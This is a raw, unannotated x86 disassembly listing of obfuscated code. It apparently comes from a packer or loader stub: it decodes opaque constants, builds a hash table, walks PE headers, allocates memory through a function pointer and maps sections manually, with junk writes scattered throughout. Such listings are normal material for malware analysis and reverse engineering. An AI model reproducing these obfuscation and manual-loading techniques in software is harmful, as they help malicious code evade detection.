  41961c:	mov    eax,DWORD PTR [ebp-0x8]
  41961f:	pop    edi
  419620:	mov    DWORD PTR [ebx],eax
  419622:	mov    eax,DWORD PTR [ebp-0x8]
  419625:	pop    esi
  419626:	leave  
  419627:	ret    
  419628:	push   ebp
  419629:	mov    ebp,esp
  41962b:	sub    esp,0x420
  419631:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  419638:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  41963f:	mov    DWORD PTR [ebp-0x18],0xf89c8685
  419646:	push   ebx
  419647:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41964e:	mov    eax,DWORD PTR [ebp-0x14]
  419651:	push   esi
  419652:	mov    esi,0x751089b
  419657:	push   edi
  419658:	xor    eax,esi
  41965a:	mov    edi,0x3272e2
  41965f:	add    eax,edi
  419661:	mov    DWORD PTR [ebp-0x8],eax
  419664:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41966b:	mov    DWORD PTR [ebp-0x4],0xead718a5
  419672:	mov    DWORD PTR [ebp-0x10],0x8
  419679:	mov    ecx,ecx
  41967b:	mov    eax,DWORD PTR [ebp-0xc]
  41967e:	mov    ecx,DWORD PTR [ebp-0x14]
  419681:	xor    eax,esi
  419683:	xor    ecx,esi
  419685:	add    eax,edi
  419687:	add    ecx,edi
  419689:	imul   eax,ecx
  41968c:	jmp    0x4196bf
  41968e:	mov    eax,DWORD PTR [ebp-0x4]
  419691:	sub    eax,edi
  419693:	xor    eax,esi
  419695:	mov    DWORD PTR [ebp-0x8],eax
  419698:	lea    ebx,[ebp-0x8]
  41969b:	call   0x419580
  4196a0:	mov    DWORD PTR [ebp-0x8],eax
  4196a3:	mov    eax,DWORD PTR [ebp-0x8]
  4196a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4196a9:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  4196b0:	mov    eax,DWORD PTR [ebp-0xc]
  4196b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4196b6:	xor    eax,esi
  4196b8:	lea    eax,[eax+ecx*1+0x3272e2]
  4196bf:	mov    DWORD PTR [ebp-0x4],eax
  4196c2:	mov    eax,DWORD PTR [ebp-0x18]
  4196c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4196c8:	xor    ecx,esi
  4196ca:	xor    eax,esi
  4196cc:	sub    eax,ecx
  4196ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4196d1:	cmp    ecx,eax
  4196d3:	jbe    0x41968e
  4196d5:	mov    eax,DWORD PTR [ebp-0x1c]
  4196d8:	xor    eax,esi
  4196da:	add    eax,edi
  4196dc:	mov    DWORD PTR [ebp-0x8],eax
  4196df:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  4196e6:	mov    ebx,ebx
  4196e8:	jmp    0x41974b
  4196ea:	mov    ecx,DWORD PTR [ebp-0x20]
  4196ed:	mov    eax,DWORD PTR [ebp-0x8]
  4196f0:	xor    ecx,esi
  4196f2:	add    ecx,edi
  4196f4:	shr    eax,cl
  4196f6:	mov    DWORD PTR [ebp-0x4],eax
  4196f9:	mov    eax,DWORD PTR [ebp+0x8]
  4196fc:	mov    cl,BYTE PTR [eax]
  4196fe:	mov    BYTE PTR [ebp+0xb],cl
  419701:	mov    cl,BYTE PTR [ebp+0xb]
  419704:	mov    edx,DWORD PTR [ebp-0x8]
  419707:	movzx  ecx,cl
  41970a:	xor    ecx,edx
  41970c:	mov    DWORD PTR [ebp+0x8],ecx
  41970f:	mov    ecx,DWORD PTR [ebp-0x18]
  419712:	mov    edx,DWORD PTR [ebp+0x8]
  419715:	xor    ecx,esi
  419717:	add    ecx,edi
  419719:	and    ecx,edx
  41971b:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  419722:	mov    edx,DWORD PTR [ebp-0x4]
  419725:	xor    ecx,edx
  419727:	mov    DWORD PTR [ebp-0x8],ecx
  41972a:	mov    ecx,DWORD PTR [ebp-0xc]
  41972d:	xor    ecx,esi
  41972f:	lea    eax,[eax+ecx*1+0x3272e2]
  419736:	mov    DWORD PTR [ebp+0x8],eax
  419739:	mov    eax,DWORD PTR [ebp-0xc]
  41973c:	xor    eax,esi
  41973e:	mov    ecx,0xffcd8d1e
  419743:	sub    ecx,eax
  419745:	add    ecx,DWORD PTR [ebp-0x10]
  419748:	mov    DWORD PTR [ebp-0x10],ecx
  41974b:	mov    eax,DWORD PTR [ebp-0x14]
  41974e:	mov    ecx,DWORD PTR [ebp-0x10]
  419751:	xor    eax,esi
  419753:	add    eax,edi
  419755:	cmp    ecx,eax
  419757:	jne    0x4196ea
  419759:	mov    eax,DWORD PTR [ebp-0x1c]
  41975c:	mov    ecx,DWORD PTR [ebp-0x8]
  41975f:	xor    eax,esi
  419761:	add    eax,edi
  419763:	pop    edi
  419764:	pop    esi
  419765:	xor    eax,ecx
  419767:	pop    ebx
  419768:	leave  
  419769:	ret    0x4
  41976c:	push   ebp
  41976d:	mov    ebp,esp
  41976f:	mov    eax,DWORD PTR [ebp+0x1c]
  419772:	mov    ecx,DWORD PTR [ebp+0x8]
  419775:	mov    edx,DWORD PTR [ebp+0x10]
  419778:	mov    eax,DWORD PTR [eax+0x190]
  41977e:	mov    eax,DWORD PTR [eax]
  419780:	sub    esp,0x64
  419783:	push   ebx
  419784:	push   esi
  419785:	push   edi
  419786:	mov    edi,0x751089b
  41978b:	xor    ecx,edi
  41978d:	mov    ebx,0x3272e2
  419792:	add    ecx,ebx
  419794:	cmp    ecx,edx
  419796:	jne    0x4197a7
  419798:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  4197a2:	jmp    0x419ca3
  4197a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4197aa:	mov    esi,DWORD PTR [ebp+0x14]
  4197ad:	mov    edx,DWORD PTR [esi]
  4197af:	xor    ecx,edi
  4197b1:	add    ecx,ebx
  4197b3:	cmp    edx,ecx
  4197b5:	je     0x419c5e
  4197bb:	mov    ecx,DWORD PTR [ebp+0x1c]
  4197be:	mov    DWORD PTR [ebp-0x1c],eax
  4197c1:	mov    DWORD PTR [ebp+0x1c],ecx
  4197c4:	mov    ecx,DWORD PTR [ebp+0x18]
  4197c7:	mov    eax,DWORD PTR [esi]
  4197c9:	mov    DWORD PTR [ebp-0x20],eax
  4197cc:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  4197d3:	mov    edx,0xf89c8584
  4197d8:	mov    DWORD PTR [ebp-0x8],edx
  4197db:	mov    eax,DWORD PTR [ebp+0x1c]
  4197de:	mov    DWORD PTR [ebp+0x1c],eax
  4197e1:	mov    eax,DWORD PTR [ebp+0x1c]
  4197e4:	mov    eax,DWORD PTR [eax+0x190]
  4197ea:	mov    eax,DWORD PTR [eax]
  4197ec:	mov    DWORD PTR [ebp-0x24],ecx
  4197ef:	mov    ecx,DWORD PTR [ebp+0x1c]
  4197f2:	mov    ecx,DWORD PTR [ecx+0x190]
  4197f8:	mov    ecx,DWORD PTR [ecx]
  4197fa:	add    ecx,DWORD PTR [eax+0x3c]
  4197fd:	mov    DWORD PTR [ebp+0x10],ecx
  419800:	mov    eax,DWORD PTR [ebp+0x8]
  419803:	xor    eax,edi
  419805:	add    eax,ebx
  419807:	mov    DWORD PTR [ebp-0x4],eax
  41980a:	mov    eax,DWORD PTR [ebp+0x8]
  41980d:	xor    eax,edi
  41980f:	add    eax,ebx
  419811:	mov    DWORD PTR [ebp+0x18],eax
  419814:	mov    eax,DWORD PTR [ebp+0x10]
  419817:	mov    eax,DWORD PTR [eax+0x50]
  41981a:	sub    eax,0xc
  41981d:	mov    DWORD PTR [ebp-0x28],eax
  419820:	mov    eax,DWORD PTR [ebp+0x10]
  419823:	mov    eax,DWORD PTR [eax+0x38]
  419826:	mov    ecx,DWORD PTR [ebp+0x10]
  419829:	dec    eax
  41982a:	test   DWORD PTR [ecx+0x54],eax
  41982d:	mov    eax,DWORD PTR [ebp+0x10]
  419830:	je     0x41984a
  419832:	mov    eax,DWORD PTR [eax+0x38]
  419835:	mov    ecx,DWORD PTR [ebp+0x10]
  419838:	mov    ecx,DWORD PTR [ecx+0x54]
  41983b:	dec    eax
  41983c:	not    eax
  41983e:	and    ecx,eax
  419840:	mov    eax,DWORD PTR [ebp+0x10]
  419843:	mov    eax,DWORD PTR [eax+0x38]
  419846:	add    eax,ecx
  419848:	jmp    0x41984d
  41984a:	mov    eax,DWORD PTR [eax+0x54]
  41984d:	mov    DWORD PTR [ebp+0x1c],eax
  419850:	mov    eax,DWORD PTR [ebp+0x8]
  419853:	xor    eax,edi
  419855:	add    eax,ebx
  419857:	mov    DWORD PTR [ebp+0x18],eax
  41985a:	mov    eax,DWORD PTR [ebp+0x8]
  41985d:	xor    eax,edi
  41985f:	add    eax,ebx
  419861:	mov    DWORD PTR [ebp+0x18],eax
  419864:	mov    eax,DWORD PTR [ebp+0x8]
  419867:	mov    ecx,DWORD PTR [ebp-0x24]
  41986a:	xor    eax,edi
  41986c:	add    eax,ebx
  41986e:	mov    DWORD PTR [ecx],eax
  419870:	mov    DWORD PTR [ebp+0x18],edx
  419873:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  41987a:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  419881:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  419888:	mov    eax,DWORD PTR [ebp-0x8]
  41988b:	mov    ecx,DWORD PTR [ebp+0x1c]
  41988e:	xor    eax,edi
  419890:	add    eax,ebx
  419892:	imul   eax,ecx
  419895:	mov    ecx,DWORD PTR [ebp+0x8]
  419898:	mov    edx,DWORD PTR [ebp-0x28]
  41989b:	xor    ecx,edi
  41989d:	lea    ecx,[ecx+edx*1+0x3272e2]
  4198a4:	cmp    eax,ecx
  4198a6:	jae    0x419c57
  4198ac:	mov    eax,DWORD PTR [ebp+0x8]
  4198af:	xor    eax,edi
  4198b1:	add    eax,ebx
  4198b3:	mov    DWORD PTR [ebp+0x18],eax
  4198b6:	mov    eax,DWORD PTR [ebp+0x1c]
  4198b9:	add    eax,DWORD PTR [ebp-0x1c]
  4198bc:	mov    DWORD PTR [ebp-0x4],eax
  4198bf:	push   DWORD PTR [ebp-0x4]
  4198c2:	mov    esi,DWORD PTR [ebp-0x1c]
  4198c5:	mov    ecx,DWORD PTR [ebp+0x10]
  4198c8:	call   0x4189c0
  4198cd:	mov    DWORD PTR [ebp+0xc],eax
  4198d0:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  4198d7:	mov    eax,DWORD PTR [ebp-0x18]
  4198da:	xor    eax,edi
  4198dc:	lea    ecx,[ebp-0x40]
  4198df:	add    eax,ebx
  4198e1:	push   ecx
  4198e2:	call   0x418fa3
  4198e7:	mov    eax,DWORD PTR [ebp+0xc]
  4198ea:	test   eax,eax
  4198ec:	je     0x41993c
  4198ee:	mov    eax,DWORD PTR [ebp-0x18]
  4198f1:	xor    eax,edi
  4198f3:	add    eax,ebx
  4198f5:	push   eax
  4198f6:	push   DWORD PTR [ebp+0xc]
  4198f9:	lea    eax,[ebp-0x40]
  4198fc:	push   eax
  4198fd:	call   0x418e4a
  419902:	mov    eax,DWORD PTR [ebp-0x4]
  419905:	mov    DWORD PTR [ebp-0x18],eax
  419908:	mov    eax,DWORD PTR [ebp-0x18]
  41990b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41990e:	sub    eax,ecx
  419910:	mov    DWORD PTR [ebp-0x18],eax
  419913:	mov    eax,DWORD PTR [ebp+0xc]
  419916:	mov    ecx,DWORD PTR [ebp+0xc]
  419919:	mov    eax,DWORD PTR [eax+0x10]
  41991c:	add    eax,DWORD PTR [ecx+0xc]
  41991f:	mov    ecx,DWORD PTR [ebp-0x18]
  419922:	cmp    ecx,eax
  419924:	jb     0x41993c
  419926:	mov    eax,DWORD PTR [ebp+0xc]
  419929:	mov    eax,DWORD PTR [eax+0xc]
  41992c:	mov    ecx,DWORD PTR [ebp+0xc]
  41992f:	add    eax,DWORD PTR [ecx+0x8]
  419932:	mov    ecx,DWORD PTR [ebp-0x18]
  419935:	sub    eax,ecx
  419937:	jmp    0x419c2a
  41993c:	push   0xc
  41993e:	push   DWORD PTR [ebp-0x4]
  419941:	lea    eax,[ebp-0x4c]
  419944:	push   eax
  419945:	call   0x418e4a
  41994a:	mov    eax,0xf89c8585
  41994f:	mov    DWORD PTR [ebp-0x2c],eax
  419952:	mov    DWORD PTR [ebp-0x30],0xf89c8584
  419959:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  419960:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  419967:	lea    ecx,[ebp-0x2c]
  41996a:	mov    DWORD PTR [ebp-0xc],ecx
  41996d:	lea    ecx,[ebp-0x30]
  419970:	mov    DWORD PTR [ebp-0x10],ecx
  419973:	lea    ecx,[ebp-0x34]
  419976:	mov    DWORD PTR [ebp+0xc],ecx
  419979:	lea    ecx,[ebp-0x38]
  41997c:	mov    DWORD PTR [ebp-0x14],ecx
  41997f:	mov    ecx,DWORD PTR [ebp+0x8]
  419982:	xor    ecx,edi
  419984:	add    ecx,ebx
  419986:	mov    DWORD PTR [ebp-0x18],ecx
  419989:	jmp    0x419b85
  41998e:	cmp    eax,0xf89c85bb
  419993:	je     0x419b97
  419999:	mov    ecx,DWORD PTR [ebp-0x8]
  41999c:	xor    ecx,edi
  41999e:	mov    esi,eax
  4199a0:	add    ecx,ebx
  4199a2:	mov    DWORD PTR [ebp+0x18],ecx
  4199a5:	mov    eax,DWORD PTR [ebp-0x18]
  4199a8:	xor    esi,edi
  4199aa:	lea    eax,[eax+esi*1+0x3272e2]
  4199b1:	mov    DWORD PTR [ebp-0x18],eax
  4199b4:	mov    eax,DWORD PTR [ebp-0x8]
  4199b7:	mov    ecx,DWORD PTR [ebp-0x18]
  4199ba:	xor    eax,edi
  4199bc:	add    eax,ebx
  4199be:	cmp    ecx,eax
  4199c0:	jne    0x4199d5
  4199c2:	mov    eax,DWORD PTR [ebp+0x8]
  4199c5:	xor    eax,edi
  4199c7:	add    eax,ebx
  4199c9:	push   eax
  4199ca:	push   0xc
  4199cc:	lea    eax,[ebp-0x4c]
  4199cf:	push   eax
  4199d0:	call   0x4193d7
  4199d5:	mov    eax,DWORD PTR [ebp-0xc]
  4199d8:	mov    eax,DWORD PTR [eax]
  4199da:	xor    eax,edi
  4199dc:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4199e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4199e6:	xor    ecx,edi
  4199e8:	movzx  eax,al
  4199eb:	add    ecx,ebx
  4199ed:	cmp    eax,ecx
  4199ef:	je     0x419b6d
  4199f5:	mov    eax,DWORD PTR [ebp-0x10]
  4199f8:	mov    eax,DWORD PTR [eax]
  4199fa:	xor    eax,edi
  4199fc:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a03:	mov    ecx,DWORD PTR [ebp+0x8]
  419a06:	xor    ecx,edi
  419a08:	movzx  eax,al
  419a0b:	add    ecx,ebx
  419a0d:	cmp    eax,ecx
  419a0f:	je     0x419b6d
  419a15:	mov    eax,DWORD PTR [ebp+0xc]
  419a18:	mov    eax,DWORD PTR [eax]
  419a1a:	xor    eax,edi
  419a1c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a23:	mov    ecx,DWORD PTR [ebp+0x8]
  419a26:	xor    ecx,edi
  419a28:	movzx  eax,al
  419a2b:	add    ecx,ebx
  419a2d:	cmp    eax,ecx
  419a2f:	je     0x419b6d
  419a35:	mov    eax,DWORD PTR [ebp-0x14]
  419a38:	mov    eax,DWORD PTR [eax]
  419a3a:	xor    eax,edi
  419a3c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a43:	mov    ecx,DWORD PTR [ebp+0x8]
  419a46:	xor    ecx,edi
  419a48:	movzx  eax,al
  419a4b:	add    ecx,ebx
  419a4d:	cmp    eax,ecx
  419a4f:	je     0x419b6d
  419a55:	mov    eax,DWORD PTR [ebp-0x10]
  419a58:	mov    eax,DWORD PTR [eax]
  419a5a:	xor    eax,edi
  419a5c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a63:	mov    ecx,DWORD PTR [ebp-0xc]
  419a66:	mov    ecx,DWORD PTR [ecx]
  419a68:	xor    ecx,edi
  419a6a:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419a71:	xor    al,cl
  419a73:	mov    ecx,DWORD PTR [ebp+0xc]
  419a76:	mov    ecx,DWORD PTR [ecx]
  419a78:	xor    ecx,edi
  419a7a:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419a81:	or     al,cl
  419a83:	mov    ecx,DWORD PTR [ebp-0xc]
  419a86:	mov    ecx,DWORD PTR [ecx]
  419a88:	xor    ecx,edi
  419a8a:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419a91:	cmp    cl,al
  419a93:	jne    0x419b6d
  419a99:	mov    eax,DWORD PTR [ebp+0xc]
  419a9c:	mov    eax,DWORD PTR [eax]
  419a9e:	xor    eax,edi
  419aa0:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419aa7:	mov    ecx,DWORD PTR [ebp-0x10]
  419aaa:	mov    ecx,DWORD PTR [ecx]
  419aac:	xor    ecx,edi
  419aae:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419ab5:	xor    al,cl
  419ab7:	mov    ecx,DWORD PTR [ebp-0x14]
  419aba:	mov    ecx,DWORD PTR [ecx]
  419abc:	xor    ecx,edi
  419abe:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419ac5:	or     al,cl
  419ac7:	mov    ecx,DWORD PTR [ebp-0x10]
  419aca:	mov    ecx,DWORD PTR [ecx]
  419acc:	xor    ecx,edi
  419ace:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419ad5:	cmp    cl,al
  419ad7:	jne    0x419b6d
  419add:	mov    eax,DWORD PTR [ebp-0x14]
  419ae0:	mov    eax,DWORD PTR [eax]
  419ae2:	xor    eax,edi
  419ae4:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419aeb:	mov    ecx,DWORD PTR [ebp+0xc]
  419aee:	mov    ecx,DWORD PTR [ecx]
  419af0:	xor    ecx,edi
  419af2:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419af9:	xor    al,cl
  419afb:	mov    ecx,DWORD PTR [ebp-0xc]
  419afe:	mov    ecx,DWORD PTR [ecx]
  419b00:	xor    ecx,edi
  419b02:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b09:	or     al,cl
  419b0b:	mov    ecx,DWORD PTR [ebp+0xc]
  419b0e:	mov    ecx,DWORD PTR [ecx]
  419b10:	xor    ecx,edi
  419b12:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419b19:	cmp    cl,al
  419b1b:	jne    0x419b6d
  419b1d:	mov    eax,DWORD PTR [ebp-0x14]
  419b20:	mov    eax,DWORD PTR [eax]
  419b22:	xor    eax,edi
  419b24:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419b2b:	mov    ecx,DWORD PTR [ebp-0xc]
  419b2e:	mov    ecx,DWORD PTR [ecx]
  419b30:	xor    ecx,edi
  419b32:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b39:	xor    al,cl
  419b3b:	mov    ecx,DWORD PTR [ebp-0x10]
  419b3e:	mov    ecx,DWORD PTR [ecx]
  419b40:	xor    ecx,edi
  419b42:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b49:	or     al,cl
  419b4b:	mov    ecx,DWORD PTR [ebp-0x14]
  419b4e:	mov    ecx,DWORD PTR [ecx]
  419b50:	xor    ecx,edi
  419b52:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419b59:	cmp    cl,al
  419b5b:	jne    0x419b6d
  419b5d:	lea    eax,[ebp-0x4c]
  419b60:	push   eax
  419b61:	call   0x419628
  419b66:	mov    ecx,DWORD PTR [ebp-0x44]
  419b69:	cmp    eax,ecx
  419b6b:	je     0x419b77
  419b6d:	mov    eax,DWORD PTR [ebp+0x8]
  419b70:	xor    eax,edi
  419b72:	add    eax,ebx
  419b74:	mov    DWORD PTR [ebp+0x18],eax
  419b77:	mov    eax,DWORD PTR [ebp-0x8]
  419b7a:	xor    eax,edi
  419b7c:	lea    eax,[eax+esi*1+0x3272e2]
  419b83:	xor    eax,edi
  419b85:	mov    ecx,DWORD PTR [ebp+0x8]
  419b88:	mov    edx,DWORD PTR [ebp+0x18]
  419b8b:	xor    ecx,edi
  419b8d:	add    ecx,ebx
  419b8f:	cmp    edx,ecx
  419b91:	je     0x41998e
  419b97:	mov    eax,DWORD PTR [ebp+0x8]
  419b9a:	mov    ecx,DWORD PTR [ebp+0x18]
  419b9d:	xor    eax,edi
  419b9f:	add    eax,ebx
  419ba1:	cmp    ecx,eax
  419ba3:	jne    0x419bb6
  419ba5:	mov    eax,DWORD PTR [ebp-0x8]
  419ba8:	mov    ecx,DWORD PTR [ebp+0x1c]
  419bab:	xor    eax,edi
  419bad:	lea    eax,[eax+ecx*1+0x3272e2]
  419bb4:	jmp    0x419c2d
  419bb6:	push   0x18
  419bb8:	push   DWORD PTR [ebp-0x4]
  419bbb:	lea    eax,[ebp-0x64]
  419bbe:	push   eax
  419bbf:	call   0x418e4a
  419bc4:	mov    eax,DWORD PTR [ebp+0x8]
  419bc7:	mov    ecx,DWORD PTR [ebp-0x18]
  419bca:	xor    eax,edi
  419bcc:	add    eax,ebx
  419bce:	cmp    eax,ecx
  419bd0:	je     0x419be5
  419bd2:	mov    eax,DWORD PTR [ebp+0x8]
  419bd5:	xor    eax,edi
  419bd7:	add    eax,ebx
  419bd9:	push   eax
  419bda:	push   0x18
  419bdc:	lea    eax,[ebp-0x64]
  419bdf:	push   eax
  419be0:	call   0x4193d7
  419be5:	mov    eax,DWORD PTR [ebp-0x4]
  419be8:	add    eax,0x18
  419beb:	mov    DWORD PTR [ebp+0x18],eax
  419bee:	push   DWORD PTR [ebp-0x50]
  419bf1:	push   DWORD PTR [ebp+0x18]
  419bf4:	mov    eax,DWORD PTR [ebp-0x54]
  419bf7:	add    eax,DWORD PTR [ebp-0x20]
  419bfa:	push   eax
  419bfb:	call   0x418e4a
  419c00:	mov    eax,DWORD PTR [ebp+0x8]
  419c03:	mov    ecx,DWORD PTR [ebp-0x18]
  419c06:	xor    eax,edi
  419c08:	add    eax,ebx
  419c0a:	cmp    eax,ecx
  419c0c:	je     0x419c1f
  419c0e:	push   0x0
  419c10:	push   DWORD PTR [ebp-0x50]
  419c13:	mov    eax,DWORD PTR [ebp-0x54]
  419c16:	add    eax,DWORD PTR [ebp-0x20]
  419c19:	push   eax
  419c1a:	call   0x4193d7
  419c1f:	mov    eax,DWORD PTR [ebp-0x24]
  419c22:	mov    ecx,DWORD PTR [ebp-0x50]
  419c25:	add    DWORD PTR [eax],ecx
  419c27:	mov    eax,DWORD PTR [ebp-0x50]
  419c2a:	add    eax,DWORD PTR [ebp+0x1c]
  419c2d:	mov    DWORD PTR [ebp+0x1c],eax
  419c30:	mov    eax,DWORD PTR [ebp-0x8]
  419c33:	mov    ecx,DWORD PTR [ebp+0x1c]
  419c36:	xor    eax,edi
  419c38:	add    eax,ebx
  419c3a:	imul   eax,ecx
  419c3d:	mov    ecx,DWORD PTR [ebp+0x8]
  419c40:	mov    edx,DWORD PTR [ebp-0x28]
  419c43:	xor    ecx,edi
  419c45:	lea    ecx,[ecx+edx*1+0x3272e2]
  419c4c:	cmp    eax,ecx
  419c4e:	jb     0x4198ac
  419c54:	mov    esi,DWORD PTR [ebp+0x14]
  419c57:	mov    eax,DWORD PTR [ebp-0x20]
  419c5a:	mov    DWORD PTR [esi],eax
  419c5c:	jmp    0x419ca3
  419c5e:	mov    ecx,DWORD PTR [ebp+0x8]
  419c61:	mov    edx,DWORD PTR [ebp+0xc]
  419c64:	xor    ecx,edi
  419c66:	xor    edx,edi
  419c68:	add    ecx,ebx
  419c6a:	add    edx,ebx
  419c6c:	cmp    ecx,edx
  419c6e:	jne    0x419c82
  419c70:	mov    eax,ds:0x7f642d1e
  419c75:	imul   eax,eax,0x9f15fcef
  419c7b:	mov    ds:0x7f642d1e,eax
  419c80:	jmp    0x419ca3
  419c82:	mov    ecx,DWORD PTR [ebp+0x8]
  419c85:	xor    ecx,edi
  419c87:	add    ecx,ebx
  419c89:	cmp    eax,ecx
  419c8b:	je     0x419c99
  419c8d:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  419c97:	jmp    0x419ca3
  419c99:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  419ca3:	pop    edi
  419ca4:	pop    esi
  419ca5:	pop    ebx
  419ca6:	leave  
  419ca7:	ret    0x18
  419caa:	push   ebp
  419cab:	mov    ebp,esp
  419cad:	and    esp,0xfffffff8
  419cb0:	mov    eax,DWORD PTR [ebp+0x20]
  419cb3:	sub    esp,0x14
  419cb6:	push   ebx
  419cb7:	mov    ebx,DWORD PTR [ebp+0x14]
  419cba:	push   esi
  419cbb:	push   edi
  419cbc:	cmp    eax,0xf89c8585
  419cc1:	jne    0x419ccd
  419cc3:	push   0xf89c8584
  419cc8:	jmp    0x419dff
  419ccd:	mov    eax,DWORD PTR [ebp+0x20]
  419cd0:	cmp    eax,0xf89c8584
  419cd5:	jne    0x419ce1
  419cd7:	push   0xf89c85bb
  419cdc:	jmp    0x419dff
  419ce1:	mov    eax,DWORD PTR [ebp+0x20]
  419ce4:	cmp    eax,0xf89c85bb
  419ce9:	jne    0x419cf5
  419ceb:	push   0xf89c85ba
  419cf0:	jmp    0x419dff
  419cf5:	mov    eax,DWORD PTR [ebp+0x20]
  419cf8:	cmp    eax,0xf89c85ba
  419cfd:	jne    0x419d09
  419cff:	push   0xf89c85b9
  419d04:	jmp    0x419dff
  419d09:	mov    ecx,DWORD PTR [ebp+0x20]
  419d0c:	mov    eax,0xf89c85be
  419d11:	cmp    ecx,eax
  419d13:	jne    0x419dcf
  419d19:	mov    eax,DWORD PTR [ebp+0x10]
  419d1c:	mov    DWORD PTR [esp+0xc],eax
  419d20:	mov    eax,DWORD PTR [ebp+0x18]
  419d23:	mov    DWORD PTR [esp+0x14],eax
  419d27:	mov    eax,DWORD PTR [ebp+0xc]
  419d2a:	mov    DWORD PTR [esp+0x18],eax
  419d2e:	mov    eax,DWORD PTR [ebp+0x8]
  419d31:	mov    DWORD PTR [esp+0x10],eax
  419d35:	mov    eax,DWORD PTR [esp+0x10]
  419d39:	mov    ecx,DWORD PTR [esp+0x14]
  419d3d:	mov    edi,0x751089b
  419d42:	xor    eax,edi
  419d44:	mov    esi,0x3272e2
  419d49:	add    eax,esi
  419d4b:	mov    DWORD PTR [ecx],eax
  419d4d:	mov    eax,DWORD PTR [esp+0xc]
  419d51:	mov    eax,DWORD PTR [eax+0x194]
  419d57:	mov    ecx,DWORD PTR [eax]
  419d59:	mov    eax,DWORD PTR [esp+0xc]
  419d5d:	mov    eax,DWORD PTR [eax+0x194]
  419d63:	mov    eax,DWORD PTR [eax]
  419d65:	add    eax,DWORD PTR [ecx+0x3c]
  419d68:	mov    ecx,DWORD PTR [esp+0xc]
  419d6c:	mov    ecx,DWORD PTR [ecx+0x1d8]
  419d72:	mov    ecx,DWORD PTR [ecx+0x14]
  419d75:	push   0x4
  419d77:	push   0x3000
  419d7c:	push   DWORD PTR [eax+0x50]
  419d7f:	push   0x0
  419d81:	call   ecx
  419d83:	mov    DWORD PTR [ebx],eax
  419d85:	mov    eax,DWORD PTR [esp+0x10]
  419d89:	push   DWORD PTR [esp+0xc]
  419d8d:	xor    eax,edi
  419d8f:	add    eax,esi
  419d91:	mov    DWORD PTR [esp+0x20],eax
  419d95:	lea    eax,[esp+0x20]
  419d99:	push   eax
  419d9a:	push   ebx
  419d9b:	push   DWORD PTR [esp+0x20]
  419d9f:	push   DWORD PTR [esp+0x28]
  419da3:	push   DWORD PTR [esp+0x24]
  419da7:	call   0x41976c
  419dac:	mov    eax,DWORD PTR [esp+0x10]
  419db0:	mov    ecx,DWORD PTR [ebx]
  419db2:	xor    eax,edi
  419db4:	add    eax,esi
  419db6:	cmp    ecx,eax
  419db8:	je     0x419e16
  419dba:	mov    eax,DWORD PTR [esp+0x18]
  419dbe:	mov    ecx,DWORD PTR [esp+0x14]
  419dc2:	xor    eax,edi
  419dc4:	add    eax,esi
  419dc6:	imul   eax,DWORD PTR [esp+0x1c]
  419dcb:	mov    DWORD PTR [ecx],eax
  419dcd:	jmp    0x419e16
  419dcf:	mov    ecx,DWORD PTR [ebp+0x20]
  419dd2:	cmp    ecx,0xf89c85b9
  419dd8:	jne    0x419de1
  419dda:	push   0xf89c85b8
  419ddf:	jmp    0x419dff
  419de1:	mov    ecx,DWORD PTR [ebp+0x20]
  419de4:	cmp    ecx,0xf89c85b8
  419dea:	jne    0x419df3
  419dec:	push   0xf89c85bf
  419df1:	jmp    0x419dff
  419df3:	mov    ecx,DWORD PTR [ebp+0x20]
  419df6:	cmp    ecx,0xf89c85bf
  419dfc:	jne    0x419e16
  419dfe:	push   eax
  419dff:	push   DWORD PTR [ebp+0x1c]
  419e02:	push   DWORD PTR [ebp+0x18]
  419e05:	push   ebx
  419e06:	push   DWORD PTR [ebp+0x10]
  419e09:	push   DWORD PTR [ebp+0xc]
  419e0c:	push   DWORD PTR [ebp+0x8]
  419e0f:	call   0x419caa
  419e14:	mov    DWORD PTR [ebx],eax
  419e16:	mov    eax,DWORD PTR [ebx]
  419e18:	pop    edi
  419e19:	pop    esi
  419e1a:	pop    ebx
  419e1b:	mov    esp,ebp
  419e1d:	pop    ebp
  419e1e:	ret    0x1c
  419e21:	push   ebp
  419e22:	mov    ebp,esp
  419e24:	sub    esp,0xc
